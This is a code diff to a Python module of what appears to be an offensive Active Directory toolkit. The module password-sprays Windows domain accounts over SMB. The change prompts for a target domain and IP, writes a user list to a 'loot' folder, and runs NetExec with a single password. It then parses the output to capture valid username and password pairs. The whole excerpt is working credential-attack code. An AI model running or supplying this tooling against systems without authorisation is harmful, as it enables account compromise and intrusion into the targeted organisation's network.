@@ -1,5 +1,3 @@
-# modules/password_spray.py
-
 import os
 import shutil
 import subprocess
@@ -13,6 +11,17 @@ def attack_password_spray(session):
 
     if not shutil.which("nxc"):
         print(red("[-] 'nxc' not found in PATH. Please install it."))
+        return
+
+    if session:
+        domain = session.domain
+        ip = session.target_ip
+    else:
+        domain = input("[?] Enter target domain: ").strip()
+        ip = input("[?] Enter target IP: ").strip()
+
+    if not domain or not ip:
+        print(red("[-] Domain and IP are required."))
         return
 
     userfile = "loot/valid_users.txt"
@@ -35,7 +44,6 @@ def attack_password_spray(session):
         print(red("[-] No password provided. Aborting."))
         return
 
-    # Prepare
     temp_userfile = "loot/spray_users.txt"
     with open(temp_userfile, "w") as f:
         f.writelines([u + "\n" for u in users])
@@ -47,8 +55,8 @@ def attack_password_spray(session):
     print(blue(f"[*] Spraying {len(users)} users with password: {password}"))
 
     cmd = [
-        "nxc", "smb", session.target_ip,
-        "-d", session.domain,
+        "nxc", "smb", ip,
+        "-d", domain,
         "-u", temp_userfile,
         "-p", password,
         "--no-bruteforce",
@@ -69,7 +77,7 @@ def attack_password_spray(session):
                 # Match: [+] domain\user:password
                 if "[+]" in line and "STATUS_LOGON_FAILURE" not in line:
                     match = re.search(
-                        rf"{re.escape(session.domain)}\\([^\s:]+):{re.escape(password)}",
+                        rf"{re.escape(domain)}\\([^\s:]+):{re.escape(password)}",
                         line, re.IGNORECASE
                     )
                     if match:
